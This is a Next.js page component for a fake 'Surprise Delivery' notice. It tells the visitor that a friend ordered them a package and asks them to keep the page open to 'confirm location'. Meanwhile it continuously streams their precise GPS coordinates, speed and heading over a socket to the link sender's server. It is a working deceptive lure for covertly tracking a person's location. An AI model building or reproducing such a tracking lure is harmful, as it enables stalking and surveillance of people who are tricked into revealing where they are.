"use client";
import { useEffect, useState, Suspense } from "react";
import io from "socket.io-client";
import { useSearchParams } from "next/navigation";

const socket = io("http://127.0.0.1:5000");

// Move the main tracking logic to a separate component
function TrackContent() {
  const searchParams = useSearchParams();
  const trackerId = searchParams.get("id") || "default123";
  const [dots, setDots] = useState("");

  useEffect(() => {
    // Animate the dots
    const interval = setInterval(() => {
      setDots(prev => prev.length >= 3 ? "" : prev + ".");
    }, 500);

    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    socket.emit("join_tracker", { tracker_id: trackerId });

    if ("geolocation" in navigator) {
      const options = {
        enableHighAccuracy: true,
        maximumAge: 0,
        timeout: 5000,
      };

      const watchId = navigator.geolocation.watchPosition(
        (pos) => {
          const {
            latitude,
            longitude,
            accuracy,
            speed,
            heading,
            timestamp
          } = pos.coords;

          socket.emit("update_location", {
            tracker_id: trackerId,
            lat: latitude,
            lng: longitude,
            accuracy: accuracy,
            speed: speed || null,
            heading: heading || null,
            timestamp: timestamp
          });
        },
        (err) => {
          console.error("❌ Geolocation error:", err);
          const getFallbackPosition = () => {
            navigator.geolocation.getCurrentPosition(
              (pos) => {
                const { latitude, longitude, accuracy } = pos.coords;
                socket.emit("update_location", {
                  tracker_id: trackerId,
                  lat: latitude,
                  lng: longitude,
                  accuracy: accuracy
                });
              },
              null,
              options
            );
          };
          const fallbackInterval = setInterval(getFallbackPosition, 2000);
          return () => clearInterval(fallbackInterval);
        },
        options
      );

      return () => {
        navigator.geolocation.clearWatch(watchId);
      };
    }
  }, [trackerId]);

  return (
    <div className="flex h-screen items-center justify-center bg-gray-50 px-4">
      <div className="max-w-md w-full bg-white rounded-2xl shadow-sm border border-gray-200 p-8 text-center">
        {/* Package Icon */}
        <div className="w-20 h-20 bg-blue-100 rounded-2xl flex items-center justify-center mx-auto mb-6">
          <svg className="w-10 h-10 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M20 7l-8-4-8 4m16 0l-8 4m8-4v10l-8 4m0-10L4 7m8 4v10M4 7v10l8 4" />
          </svg>
        </div>

        {/* Main Message */}
        <h2 className="text-2xl font-bold text-gray-900 mb-3">
          Surprise Delivery! 🎁
        </h2>
        
        <p className="text-gray-600 mb-2">
          Your friend ordered you a special package!
        </p>
        
        <p className="text-gray-600 mb-6">
          Please keep this page open to confirm your location for delivery.
        </p>

        {/* Loading Animation */}
        <div className="flex items-center justify-center gap-3 text-blue-600 mb-4">
          <div className="w-2 h-2 bg-blue-600 rounded-full animate-bounce"></div>
          <div className="w-2 h-2 bg-blue-600 rounded-full animate-bounce" style={{ animationDelay: "0.1s" }}></div>
          <div className="w-2 h-2 bg-blue-600 rounded-full animate-bounce" style={{ animationDelay: "0.2s" }}></div>
        </div>

        {/* Status Message */}
        <div className="bg-blue-50 rounded-lg p-4 border border-blue-200">
          <p className="text-sm text-blue-800 font-medium">
            Confirming your location{dots}
          </p>
          <p className="text-xs text-blue-600 mt-1">
            Delivery agent will arrive soon!
          </p>
        </div>

        {/* Fun Note */}
        <p className="text-xs text-gray-500 mt-6">
          Keep this page open until delivery is complete
        </p>
      </div>
    </div>
  );
}

// Main component with Suspense boundary
export default function Track() {
  return (
    <Suspense fallback={
      <div className="flex h-screen items-center justify-center bg-gray-50 px-4">
        <div className="max-w-md w-full bg-white rounded-2xl shadow-sm border border-gray-200 p-8 text-center">
          <div className="w-20 h-20 bg-blue-100 rounded-2xl flex items-center justify-center mx-auto mb-6">
            <svg className="w-10 h-10 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M20 7l-8-4-8 4m16 0l-8 4m8-4v10l-8 4m0-10L4 7m8 4v10M4 7v10l8 4" />
            </svg>
          </div>
          <h2 className="text-xl font-bold text-gray-900 mb-3">Loading...</h2>
          <p className="text-gray-600">Preparing your delivery tracking</p>
        </div>
      </div>
    }>
      <TrackContent />
    </Suspense>
  );
}